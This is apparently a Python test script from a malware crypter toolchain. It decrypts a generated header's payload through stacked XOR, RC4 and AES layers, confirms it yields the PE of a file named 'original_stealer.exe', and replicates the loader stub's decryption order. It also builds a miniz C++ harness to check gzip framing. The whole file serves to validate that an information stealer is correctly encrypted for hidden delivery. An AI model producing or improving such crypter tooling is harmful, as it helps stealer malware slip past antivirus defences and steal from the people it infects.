#!/usr/bin/env python3
# verify_roundtrip.py — sanity gate for the crypter + gzip framing
# checks: (1) payload_data.h decrypts back to MZ PE through every layer of the
#            generated LAYER_* table (depth read from the header, not fixed)
#         (2) GzipCompress output round-trips through gzip module (node parity)
# usage: python verify_roundtrip.py <payload_data.h> <original_stealer.exe>
import re, sys, zlib
from Crypto.Cipher import AES

def get(header, name):
    m = re.search(rf'uint8_t {name}(?:\[\d*\])? = \{{([^}}]+)}}', header, re.S)
    return bytes(int(x, 16) for x in re.findall(r'0x([0-9A-Fa-f]{2})', m.group(1)))

def xor_rolling(d, k): return bytes(b ^ k[i % len(k)] for i, b in enumerate(d))

def rc4(d, k):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + k[i % len(k)]) % 256; S[i], S[j] = S[j], S[i]
    i = j = 0; out = bytearray(len(d))
    for n, b in enumerate(d):
        i = (i + 1) % 256; j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out[n] = b ^ S[(S[i] + S[j]) % 256]
    return bytes(out)

def aes_dec(d, k, iv): return AES.new(k, AES.MODE_CBC, iv).decrypt(d)

hdr = open(sys.argv[1], encoding='latin-1').read()
orig = open(sys.argv[2], 'rb').read()

def table(header, name):
    """read one of the LAYER_* descriptor arrays out of the generated header"""
    m = re.search(rf'{name}\s*\[\s*\d+\s*\]\s*=\s*\{{([^}}]*)\}}', header)
    if not m:
        sys.exit(f'[!!] header has no {name}[] table — rebuild with builder.py')
    return [x.strip() for x in m.group(1).split(',') if x.strip()]

enc   = get(hdr, 'ENC_PAYLOAD')
kinds = [int(x) for x in table(hdr, 'LAYER_KIND')]
keys  = table(hdr, 'LAYER_KEY')
ivs   = table(hdr, 'LAYER_IV')
count = int(re.search(r'LAYER_COUNT\s*=\s*(\d+)', hdr).group(1))
assert count == len(kinds) == len(keys) == len(ivs), \
    f'layer table inconsistent: count={count} kinds={len(kinds)} keys={len(keys)}'

# reverse of the encryption order — the exact walk stub.cpp performs
d = enc
for i in range(count - 1, -1, -1):
    k = get(hdr, keys[i])
    if   kinds[i] == 0: d = xor_rolling(d, k)                       # LYR_XOR
    elif kinds[i] == 2: d = rc4(d, k)                               # LYR_RC4
    elif kinds[i] == 1: d = aes_dec(d, k, get(hdr, ivs[i]))         # LYR_AES
    else: sys.exit(f'[!!] unknown layer kind {kinds[i]} at index {i}')

assert d[:2] == b'MZ', f'decrypt gave {d[:2]!r}, not MZ'
# trailing bytes are the PKCS7 pads of the AES rounds; this harness does not
# strip them (stub.cpp strips each one as it goes) — compare to original length
n = int(re.search(r'ORIGINAL_PE_SIZE = (\d+)', hdr).group(1))
assert len(d) >= n, f'short decrypt: {len(d)} < {n}'
assert d[:n] == orig[:n], 'decrypted bytes diverge from source PE'
print(f'[ok] {count}-layer round-trip: {n:,} B identical, MZ intact')

# gzip framing parity: emulate GzipCompress (raw deflate -15 + 10B hdr + crc/isize)
import subprocess, os, tempfile
src = r'''
#include "miniz.h"
#include <cstdio>
#include <vector>
int main(int argc, char** argv) {
    FILE* f = fopen(argv[1], "rb");
    std::vector<uint8_t> in;
    int c; while ((c = fgetc(f)) != EOF) in.push_back((uint8_t)c);
    fclose(f);
    mz_stream s{};
    if (mz_deflateInit2(&s, 9, MZ_DEFLATED, -15, 9, MZ_DEFAULT_STRATEGY) != MZ_OK) return 2;
    s.next_in = in.data(); s.avail_in = (mz_uint32)in.size();
    std::vector<uint8_t> out(mz_deflateBound(&s, (mz_ulong)in.size()) + 64);
    s.next_out = out.data(); s.avail_out = (mz_uint32)out.size();
    if (mz_deflate(&s, MZ_FINISH) != MZ_STREAM_END) return 3;
    size_t n = s.total_out; mz_deflateEnd(&s);
    static const uint8_t hdr[10] = {0x1F,0x8B,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0xFF};
    FILE* o = fopen(argv[2], "wb");
    fwrite(hdr, 1, 10, o); fwrite(out.data(), 1, n, o);
    uint32_t crc = (uint32_t)mz_crc32(MZ_CRC32_INIT, in.data(), (mz_uint32)in.size());
    uint32_t isize = (uint32_t)in.size();
    for (int i = 0; i < 4; ++i) fputc((crc >> (8*i)) & 0xFF, o);
    for (int i = 0; i < 4; ++i) fputc((isize >> (8*i)) & 0xFF, o);
    fclose(o);
    return 0;
}
'''
tp = tempfile.mkdtemp()
src_p = os.path.join(tp, 'gztest.cpp')
open(src_p, 'w').write(src)
tp_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'payload', 'third_party')
exe = os.path.join(tp, 'gztest.exe')
r = subprocess.run(['g++', '-O2', src_p, '-o', exe, f'-I{tp_dir}',
                    os.path.join(tp_dir, 'miniz.c'), os.path.join(tp_dir, 'miniz_tdef.c'),
                    os.path.join(tp_dir, 'miniz_tinfl.c'), os.path.join(tp_dir, 'miniz_zip.c')],
                   capture_output=True, text=True)
if r.returncode != 0:
    print('[!!] gzip harness compile failed'); print(r.stderr[-2000:]); sys.exit(1)
sample = orig[:65536] * 3
inp = os.path.join(tp, 'in.bin'); gz = os.path.join(tp, 'out.gz')
open(inp, 'wb').write(sample)
r = subprocess.run([exe, inp, gz], capture_output=True)
assert r.returncode == 0, f'gzip harness rc={r.returncode}'
blob = open(gz, 'rb').read()
back = zlib.decompress(blob, 16 + zlib.MAX_WBITS)   # gzip window = node gunzipSync path
assert back == sample, 'gzip round-trip mismatch'
print(f'[ok] gzip framing: {len(sample):,} B -> {len(blob):,} B, decompresses via gzip module')
